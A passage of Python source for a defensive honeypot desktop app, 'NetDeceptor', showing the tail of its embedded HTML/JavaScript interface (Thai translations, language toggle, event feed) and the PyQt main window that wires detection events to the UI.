  'Path to .mmdb file (optional)': 'ที่อยู่ไฟล์ .mmdb (ไม่บังคับ)',
  'Save settings': 'บันทึกการตั้งค่า',
  'Blocked IPs': 'IP ที่ถูกบล็อก', 'Time': 'เวลา', 'Reason': 'เหตุผล', 'Status': 'สถานะ',
  'Log Integrity (SHA-256 hash chain)': 'ความสมบูรณ์ของ Log (SHA-256 hash chain)',
  "Each record is hashed together with the previous record's hash. Editing or deleting any record breaks the chain.":
    'ทุกรายการถูกแฮชร่วมกับค่าแฮชของรายการก่อนหน้า การแก้ไขหรือลบรายการใดๆ จะทำให้ห่วงโซ่ขาด',
  'Verify now': 'ตรวจสอบตอนนี้',
  'SYSTEM MONITORING ACTIVE': 'ระบบเฝ้าระวังทำงานอยู่',
  'Simulator': 'ตัวจำลอง', 'Help': 'ช่วยเหลือ',
  'Attacks Over Time (last 60 minutes)': 'การโจมตีตามช่วงเวลา (60 นาทีล่าสุด)', '1 min / bucket': 'นาทีละ 1 แท่ง',
  'Export JSON': 'ส่งออก JSON', 'Block IP': 'บล็อก IP', 'Whitelist IP': 'ยกเว้น IP',
};
const SKIP_TAGS = new Set(['SCRIPT', 'STYLE', 'TEXTAREA', 'NOSCRIPT']);
function t(k) { return LANG === 'th' && TH[k] ? TH[k] : k; }
function applyLang() {
  document.documentElement.lang = LANG;
  const w = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
  let n;
  while ((n = w.nextNode())) {
    if (SKIP_TAGS.has(n.parentNode.tagName)) continue;
    if (n._orig === undefined) n._orig = n.nodeValue;
    const key = n._orig.replace(/\s+/g, ' ').trim();
    if (LANG === 'th' && TH[key]) {
      const lead = n._orig.match(/^\s*/)[0], trail = n._orig.match(/\s*$/)[0];
      n.nodeValue = lead + TH[key] + trail;
    } else { n.nodeValue = n._orig; }
  }
  document.getElementById('lang-label').textContent = LANG === 'th' ? 'EN' : 'ไทย';
}
function buildFeed() {
  const feed = document.getElementById('log-feed');
  feed.innerHTML = '';
  if (state.history.length) { state.history.forEach(h => feed.appendChild(feedItem(h))); feed.dataset.empty = '0'; }
  else { feed.innerHTML = '<div class="p-3 bg-slate-100 rounded-lg text-slate-400 text-center">' + esc(t('Listening for real-time network probes...')) + '</div>'; feed.dataset.empty = '1'; }
}
async function toggleLang() {
  LANG = LANG === 'th' ? 'en' : 'th';
  await call('set_lang', LANG);
  if (state) { state = await call('get_state'); buildFeed(); updateActiveTraps(); applyStats(state.stats); renderTraps(); if (!document.getElementById('tab-defense').classList.contains('hidden')) renderDefense(state.defense); }
  applyLang();
  if (!document.getElementById('tab-reports').classList.contains('hidden')) loadReport();
  renderHelp(); renderSim(); if (wizOpen) renderWizard(); drawTimeline();
}
applyLang();

// ---------- boot ----------
new QWebChannel(qt.webChannelTransport, async ch => {
  bridge = ch.objects.bridge;
  state = await call('get_state');
  attackCount = state.stats.total;
  document.getElementById('stat-total').innerText = attackCount;
  document.getElementById('stat-last-ip').innerText = state.stats.last_ip || 'None';
  applyStats(state.stats); updateActiveTraps();

  LANG = state.config.lang || 'th';
  buildFeed();

  trapDraft = JSON.parse(JSON.stringify(state.config.traps));
  document.getElementById('bind-host').value = state.config.bind_host;
  renderTraps(); loadNotifyForm();
  applyLang();
  setInterval(refreshDash, 5000);
  renderHelp(); renderSim();
  timeline = await call('get_timeline'); drawTimeline();
  if (!state.config.onboarded) openWizard();
});
</script>
</body>
</html>
"""


# ==========================================
# 7. MAIN WINDOW
# ==========================================
class MainWindow(QMainWindow):
    def __init__(self, config, db, engine, notifier):
        super().__init__()
        self.setWindowTitle("NetDeceptor - Enterprise Honeypot GUI")
        self.resize(1200, 800)

        self.browser = QWebEngineView()
        self.channel = QWebChannel()
        self.bridge = Bridge(config, db, engine, notifier, self)
        self.channel.registerObject("bridge", self.bridge)
        self.browser.page().setWebChannel(self.channel)
        self.browser.setHtml(HTML_TEMPLATE)
        self.setCentralWidget(self.browser)

        engine.attack_detected.connect(self.dispatch_to_ui)   # queued across threads
        engine.defense_event.connect(self.dispatch_defense)
        self.bridge.event.connect(self.dispatch_event)

    def dispatch_to_ui(self, incident_data):
        self.browser.page().runJavaScript(f"onAttackDetected({json.dumps(incident_data)});")

    def dispatch_event(self, raw_json):
        self.browser.page().runJavaScript(f"onBridgeEvent({json.dumps(raw_json)});")

    def dispatch_defense(self, event):
        self.browser.page().runJavaScript(f"onDefenseEvent({json.dumps(event)});")


if __name__ == "__main__":
    app = QApplication(sys.argv)

    config = ConfigManager()
    db = AttackDatabase()
    notifier = Notifier(config)
    engine = HoneypotEngine(config, db, notifier)

    Thread(target=engine.run_event_loop, daemon=True).start()

    main_win = MainWindow(config, db, engine, notifier)
    main_win.show()

    sys.exit(app.exec())